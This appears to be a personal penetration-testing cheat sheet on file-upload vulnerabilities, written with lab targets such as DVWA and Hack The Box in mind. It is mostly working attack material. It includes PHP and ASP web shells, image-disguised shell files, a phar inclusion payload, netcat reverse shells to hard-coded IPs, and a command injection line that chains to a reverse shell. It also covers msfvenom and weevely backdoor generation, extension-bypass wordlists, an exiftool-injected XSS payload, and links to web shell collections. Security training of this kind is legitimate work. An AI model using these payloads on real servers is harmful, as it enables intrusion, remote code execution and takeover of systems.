echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php


php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

https://allthewriteups.gitbook.io/book/
https://0xrick.github.io/categories/
https://0xdf.gitlab.io/cheatsheets/

#weevely tool
weevely generate 123456 /root/shell.php
weevely http://192.168.1.1/dvwa/hackable/upload/shell.php 123456

#netcat
nc -e /bin/sh 192.168.1.1 8080
command injection to RCE = 127.0.0.2; nc -e /bin/sh 192.168.0.110 8080
nc -vv -l -p 8080

#remote file upload/file inclusion
<?php>
passthru('nc -e /bin/bash 192.168.0.110 8080')
?>
save file /var/www/html/reverse.txt = start apache server

#to pdf file 
ext:pdf site:*.co.in (.com,.edu.org)
https://github.com/cornerpirate/JS2PDFInjector (pdf to js injector)
vim test.js (inject xss payload)
pwd (for path)
java -jar js2pdfinjector-1.0.jar /home/kali/pdfs/testing.pdf /home/kali/pdfs/test.js
https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/README.md 


dvwa
low = img / php
change ip and port = use gedit for php-reverse-shell
nc -nvlp 4444

medium
mv php-reverse-shell.php php-reverse-shell.php.jpg 

#owasp broken web application project 
1)upload file
2)use burp suit = change contant type 
3)change extension and path = image/jpeg


https://sourceforge.net/projects/owaspbwa/files/latest/download
https://github.com/xl7dev/WebShell
https://github.com/TheBinitGhimire/Web-Shells
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
https://github.com/x-o-r-r-o/PHP-Webshells-Collection
https://github.com/topics/web-shell
https://github.com/fuzzdb-project/fuzzdb (important)

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
https://github.com/pentestmonkey/php-reverse-shell
https://github.com/Arrexel/phpbash
https://github.com/pentestmonkey/php-reverse-shell
https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php


php
<?php system($_REQUEST['cmd']); ?>

asp
<% eval request('cmd') %>

msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

Client-Side Validation
function search in console = validate,upload
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

wordlist for extensions
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

Double Extensions
shell.jpg.php

Reverse Double Extension
shell.php.jpg
shell.php.jpg?cmd=id

Character Injection
%20
%0a
%00
%0d0a
/
.\
.
…
:

example, (shell.php%00.jpg)
bash code
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done


Type Filters
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt

File Signature or Magic Bytes
https://en.wikipedia.org/wiki/List_of_file_signatures
https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime


exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

